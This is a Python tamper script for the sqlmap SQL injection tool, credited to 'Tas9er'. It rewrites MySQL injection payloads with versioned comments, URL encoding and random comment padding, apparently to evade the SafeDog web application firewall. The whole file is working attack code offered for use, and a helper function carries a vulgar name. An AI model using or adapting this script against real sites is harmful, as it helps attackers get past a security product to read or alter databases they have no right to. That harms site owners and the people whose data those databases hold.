#%21/usr/bin/env python

# MySQLByPassForSafeDog
# Code By:Tas9er
# https://github.com/Tas9er

import re
import string
import os
import random

from lib.core.enums import DBMS
from lib.core.common import singleTimeWarnMessage

def dependencies():
    singleTimeWarnMessage("MySQLByPassForSafeDog / Code By:Tas9er '%s' only %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))
    
def tamper(payload, **kwargs):
    payload=payload.replace('AND','/*%2144575%26%26*/')
    payload=payload.replace('ORD','/*%2144575ORD*/')
    payload=payload.replace('OR ','/*%2144575OR*/ ')
    payload=payload.replace('UNION SELECT','UNION/*/%21*%21**/SELECT')
    payload=payload.replace('ORDER BY',str(caonimabi())+'ORDER/*////*/BY')
    payload=payload.replace('information_schema.tables','/*!%23%0ainformation_schema.tables*/')
    payload=payload.replace('@','/*%2144575%40*/')
    payload=payload.replace('SELECT','/*%2144575%53%45%4c%45%43%54*/')
    payload=payload.replace('table_name',str(caonimabi())+'table_name')
    payload=payload.replace('MID',str(caonimabi())+'MID')
    payload=payload.replace('CAST',str(caonimabi())+'CAST')
    payload=payload.replace('USER()','%23a%0aUSER/*!*/()')
    payload=payload.replace('CURRENT_%23a%0aUSER/*!*/()',str(caonimabi())+'CURRENT_USER()')
    payload=payload.replace('SESSION_%23a%0aUSER/*!*/()','%23a%0aSESSION_USER()')
    payload=payload.replace('()','/*%2144575%28%29*/')
    payload=payload.replace(' (','/**/(')
    payload=payload.replace(',(',',/**/(')
    payload=payload.replace('),',')/**/,')
    payload=payload.replace(') ',')/**/')
    payload=payload.replace('/','%2F')
    payload=payload.replace('*','%2A')
    return payload
    
def caonimabi():
    temp = ''.join(random.sample(string.ascii_letters + string.digits, random.randint(3,9)))
    return '/*Tas9er'+temp+'*/'
    